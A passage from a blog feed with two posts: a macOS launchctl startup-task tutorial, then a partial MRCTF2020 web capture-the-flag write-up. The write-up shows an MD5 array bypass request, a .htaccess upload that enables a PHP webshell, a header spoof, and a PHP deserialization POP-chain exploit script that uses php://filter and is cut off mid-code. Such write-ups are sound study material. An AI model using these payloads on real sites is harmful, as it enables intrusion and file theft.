    <content type="html"><![CDATA[<p>macos设置开机启动任务</p><a id="more"></a><h1 id="方法1——系统偏好设置"><a href="#方法1——系统偏好设置" class="headerlink" title="方法1——系统偏好设置"></a>方法1——系统偏好设置</h1><p>进入系统偏好设置-&gt;帐户-&gt;登陆项</p><p>这个就先不讲了，体验感有点差</p><h1 id="方法2——launchctl"><a href="#方法2——launchctl" class="headerlink" title="方法2——launchctl"></a>方法2——launchctl</h1><p>launchctl是一个统一的服务管理框架，启动、停止和管理守护进程、应用程序、进程和脚本。下面讲述一下如何在Mac上使用launchctl执行定时任务。</p><h2 id="1-plist的作用"><a href="#1-plist的作用" class="headerlink" title="1. plist的作用"></a>1. plist的作用</h2><p>launchctl 将根据plist文件的信息来启动任务。<br> plist脚本一般存放在以下目录：</p><ul><li><code>/Library/LaunchDaemons</code>  –&gt;只要系统启动了，哪怕用户不登陆系统也会被执行</li><li><code>/Library/LaunchAgents</code>  –&gt;当用户登陆系统后才会被执行</li></ul><p>更多的plist存放目录：</p><blockquote><p>~/Library/LaunchAgents 由用户自己定义的任务项<br> /Library/LaunchAgents 由管理员为用户定义的任务项<br> /Library/LaunchDaemons 由管理员定义的守护进程任务项<br> /System/Library/LaunchAgents 由Mac OS X为用户定义的任务项<br> /System/Library/LaunchDaemons 由Mac OS X定义的守护进程任务项</p></blockquote><p>plist文件示例：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE plist PUBLIC -//Apple Computer//DTD PLIST 1.0//EN</span></span><br><span class="line"><span class="meta">http://www.apple.com/DTDs/PropertyList-1.0.dtd &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">plist</span> <span class="attr">version</span>=<span class="string">"1.0"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dict</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">key</span>&gt;</span>Label<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>com.example.exampled<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">key</span>&gt;</span>ProgramArguments<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">array</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">string</span>&gt;</span>exampled<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">key</span>&gt;</span>KeepAlive<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">true</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">key</span>&gt;</span>RunAtLoad<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">true</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dict</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plist</span>&gt;</span></span><br></pre></td></tr></table></figure><p>对于上面plist文件部分键值说明：</p><p><strong>Label (必须)</strong></p><p>该项服务的名称，且文件名必须和Label一致，比如上述的plist文件，文件名就叫<code>com.example.exampled.plist</code></p><p><strong>ProgramArguments</strong></p><p>指定可执行文件路径及其参数，比如执行<code>ls -a</code>，对应到该配置中，应该写作：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">key</span>&gt;</span>ProgramArguments<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">array</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">string</span>&gt;</span>ls<span class="tag">&lt;/<span class="name">string</span>&gt;</span>         </span><br><span class="line">     <span class="tag">&lt;<span class="name">string</span>&gt;</span>-a<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>RunAtLoad (可选)</strong></p><p>标识launchd在加载完该项服务之后立即启动路径指定的可执行文件。默认值为 false,设置为 true 即可实现开机运行脚本文件。</p><p><strong>StartCalendarInterval</strong> (可选)</p><p>该关键字可以用来设置定时执行可执行程序，可使用 Month, Day, Hour, Minute, Second等子关键字，它可以指定脚本在多少月，天，小时，分钟，秒，星期几等时间上执行，若缺少某个关键字则表示任意该时间点，类似于 Unix 的 Crontab 计划任务的设置方式，比如在该例子中设置为每小时的20分的时候执行该命令。</p><p><strong>KeepAlive</strong>（可选）</p><p>是否保持持续运行</p><p>所有key关键字详细使用说明可以在Mac OS X终端下使用命令<code>man launchd.plist</code>查询</p><p>更多请参考：<a href="https://www.manpagez.com/man/5/launchd.plist/" target="_blank" rel="noopener">https://www.manpagez.com/man/5/launchd.plist/</a></p><h3 id="launchctl的一些常用的命令"><a href="#launchctl的一些常用的命令" class="headerlink" title="launchctl的一些常用的命令"></a>launchctl的一些常用的命令</h3><p>检测plist文件语法是否有错误</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">plutil local.localhost.startup.plist</span><br></pre></td></tr></table></figure><h4 id="注：以下服务如果需要用sudo才能启动的，需要在命令前加入sudo"><a href="#注：以下服务如果需要用sudo才能启动的，需要在命令前加入sudo" class="headerlink" title="注：以下服务如果需要用sudo才能启动的，需要在命令前加入sudo"></a>注：以下服务如果需要用sudo才能启动的，需要在命令前加入sudo</h4><p>载入配置, 使配置生效</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 加载启动任务</span><br><span class="line">launchctl load ~<span class="regexp">/Library/</span>LaunchAgents/example.plist</span><br><span class="line"></span><br><span class="line"># 加载任务, -w选项会在下次登录/重新启动时重新启动。</span><br><span class="line">launchctl load -w ~<span class="regexp">/Library/</span>LaunchAgents/example.plist</span><br></pre></td></tr></table></figure><p>停止服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo launchctl stop &lt;path&gt;</span><br></pre></td></tr></table></figure><p>开始服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo launchctl start &lt;path&gt;</span><br></pre></td></tr></table></figure><p>kill服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo launchctl kill &lt;path&gt;</span><br></pre></td></tr></table></figure><p>卸载任务</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 停止并卸载任务。下次登录/重新启动时，任务仍将重新启动。</span><br><span class="line">launchctl unload ~<span class="regexp">/Library/</span>LaunchAgents/example.plist</span><br><span class="line"></span><br><span class="line"># 该任务将不会在下次登录/重新启动时重新启动。</span><br><span class="line">launchctl unload -w ~<span class="regexp">/Library/</span>LaunchAgents/example.plist</span><br></pre></td></tr></table></figure><p>查看服务运行状态</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">launchctl <span class="built_in">list</span></span><br><span class="line">sudo launchctl <span class="built_in">list</span>（有时候一些需要用sudo才能执行的服务就需要用sudo才能查看）</span><br></pre></td></tr></table></figure><p>输出具有以下含义：</p><p>第一个数字是进程的PID，如果它正在运行，如果它不运行，它显示一个’ - ‘。<br>第二个数字是进程的退出代码（如果它已经完成）。如果是负数，则是杀死信号的数量。<br>第三列是进程名称。</p><p>下面这个就说明开机启动nginx服务已经成功了</p><p>注意：执行<code>launchctl</code>命令加<code>sudo</code>与不加结果是完全不同的。</p><p><img src="http://images.xianyu123.club/20200520134958.png" alt="image-20200520134953097"></p><h2 id="2-先用nginx举个🌰"><a href="#2-先用nginx举个🌰" class="headerlink" title="2. 先用nginx举个🌰"></a>2. 先用nginx举个🌰</h2><p>如果你是用<code>homebrew</code>安装的<code>nginx</code>，访问<code>/usr/local/opt/nginx</code>，会发现该目录下有一个文件<code>homebrew.mxcl.nginx.plist</code>，这个就是开机自启动的配置文件，我们只需要把它复制到<code>/Library/LaunchDaemons</code>目录下即可</p><p>然后启动它就好了</p><h2 id="3-拓展"><a href="#3-拓展" class="headerlink" title="3. 拓展"></a>3. 拓展</h2><p>这里我想到了一个问题，就是在mac上我遇到过一些软件会莫名其妙开机自启动，但是在软件的设置地方又找不到取消开机自启动的选项，这样的话我们可以尝试删除这里的plist文件（这只是我的一个设想，还没有实践过😂，逃23333）</p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ul><li><a href="https://www.jianshu.com/p/4addd9b455f2" target="_blank" rel="noopener">Mac中的定时任务利器：launchctl</a></li><li><a href="https://blog.csdn.net/testcs_dn/article/details/80060551" target="_blank" rel="noopener">mac系统，php-fpm加入开机启动项</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;macos设置开机启动任务&lt;/p&gt;
    
    </summary>
    
      <category term="macos" scheme="http://0clickjacking0.github.io/categories/macos/"/>
    
    
  </entry>
  
  <entry>
    <title>MRCTF2020_web(部分)</title>
    <link href="http://0clickjacking0.github.io/2020/03/29/MRCTF2020-web-%E9%83%A8%E5%88%86/"/>
    <id>http://0clickjacking0.github.io/2020/03/29/MRCTF2020-web-部分/</id>
    <published>2020-03-29T14:24:34.000Z</published>
    <updated>2020-03-29T14:25:42.918Z</updated>
    
    <content type="html"><![CDATA[<p>MRCTF2020_web(部分)</p><a id="more"></a><h2 id="ez-bypass"><a href="#ez-bypass" class="headerlink" title="ez_bypass"></a>ez_bypass</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line">$flag=<span class="string">'MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;'</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'gg'</span>])&amp;&amp;<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>])) &#123;</span><br><span class="line">    $id=$_GET[<span class="string">'id'</span>];</span><br><span class="line">    $gg=$_GET[<span class="string">'gg'</span>];</span><br><span class="line">    <span class="keyword">if</span> (md5($id) === md5($gg) &amp;&amp; $id !== $gg) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'You got the first step'</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'passwd'</span>])) &#123;</span><br><span class="line">            $passwd=$_POST[<span class="string">'passwd'</span>];</span><br><span class="line">            <span class="keyword">if</span> (!is_numeric($passwd))</span><br><span class="line">            &#123;</span><br><span class="line">                 <span class="keyword">if</span>($passwd==<span class="number">1234567</span>)</span><br><span class="line">                 &#123;</span><br><span class="line">                     <span class="keyword">echo</span> <span class="string">'Good Job!'</span>;</span><br><span class="line">                     highlight_file(<span class="string">'flag.php'</span>);</span><br><span class="line">                     <span class="keyword">die</span>(<span class="string">'By Retr_0'</span>);</span><br><span class="line">                 &#125;</span><br><span class="line">                 <span class="keyword">else</span></span><br><span class="line">                 &#123;</span><br><span class="line">                     <span class="keyword">echo</span> <span class="string">"can you think twice??"</span>;</span><br><span class="line">                 &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'You can not get it !'</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'only one way to get the flag'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"You are not a real hacker!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Please input first'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;Please input first</span><br></pre></td></tr></table></figure><p>发包</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/?id[]=123&amp;gg[]=1</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 15a18ed6-9754-4708-9a84-7e5fbf71561f.merak-ctf.site</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:72.0) Gecko/20100101 Firefox/72.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 16</span><br><span class="line"></span><br><span class="line">passwd=1234567\n</span><br></pre></td></tr></table></figure><h2 id="你传你🐎呢"><a href="#你传你🐎呢" class="headerlink" title="你传你🐎呢"></a>你传你🐎呢</h2><p>这里没有过滤<code>.htaccess</code>文件，我们上传一个<code>.htaccess</code>的文件，内容如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SetHandler application/x-httpd-php</span><br></pre></td></tr></table></figure><p>该语句作用是让Apache将其他类型文件均以php格式解析</p><p>这样的话我们上传一张图片，内容为一句话木马，蚁剑连接即可得到flag</p><h2 id="PYwebsite"><a href="#PYwebsite" class="headerlink" title="PYwebsite"></a>PYwebsite</h2><p>访问flag.php，然后加上<code>X-Forwarded-For:127.0.0.1</code>就可以获得flag</p><h2 id="Ezpop"><a href="#Ezpop" class="headerlink" title="Ezpop"></a>Ezpop</h2><p>题目源码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">Welcome to index.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="comment">//WTF IS THIS?</span></span><br><span class="line"><span class="comment">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span></span><br><span class="line"><span class="comment">//And Crack It!</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  $var;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span><span class="params">($value)</span></span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;append(<span class="keyword">$this</span>-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file=<span class="string">'index.php'</span>)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = $file;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Welcome to '</span>.<span class="keyword">$this</span>-&gt;source.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">"/gopher|http|file|ftp|https|dict|\.\./i"</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"hacker"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">"index.php"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $p;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($key)</span></span>&#123;</span><br><span class="line">        $function = <span class="keyword">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'pop'</span>]))&#123;</span><br><span class="line">    @unserialize($_GET[<span class="string">'pop'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    $a=<span class="keyword">new</span> Show;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们先回溯找，怎么样才能得到flag呢？</p><p>我们先看<code>Modifier</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  $var;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span><span class="params">($value)</span></span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;append(<span class="keyword">$this</span>-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里有<code>append</code>方法，存在任意文件包含漏洞，所以怎么才能调用这个方法呢？这里有<code>__invoke</code>方法，我们要能把该类当作函数调用即可触发</p><p>跟进，找到Test类</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $p;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($key)</span></span>&#123;</span><br><span class="line">        $function = <span class="keyword">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我们只要把<code>$this-&gt;p=new Modifier</code>即可，那么怎么触发<code>__get</code>方法呢？</p><p>当一个对象调用无权限访问到的属性或者不存在的属性的时候就会触发<code>__get</code>方法</p><p>接着跟进Show类中的<code>__toString</code>方法，我们只要<code>$this-&gt;str=new Test</code>即可触发<code>__get</code>方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>那么怎么触发<code>__toString</code>方法呢？</p><p>当一个类被当作字符串的时候，就会触发该方法</p><p>在Show类中，我们只需要让<code>$this-&gt;source=new Show</code>，这样即可触发</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file=<span class="string">'index.php'</span>)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = $file;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Welcome to '</span>.<span class="keyword">$this</span>-&gt;source.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>运行下面代码，然后传值即可</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  $var=<span class="string">'php://filter/convert.base64-encode/resource=flag.php'</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span><span class="params">($value)</span></span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;append(<span class="keyword">$this</span>-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file=<span class="string">'index.php'</span>)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = $file;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Welcome to '</span>.<span class="keyword">$this</span>-&gt;source.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">"/gopher|http|file|ftp|https|dict|\.\./i"</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"hacker"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">"index.php"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $p;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($key)</span></span>&#123;</span><br><span class="line">        $function = <span class="keyword">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> $function();</span><br><span class="line">    &#125;</span><br><span 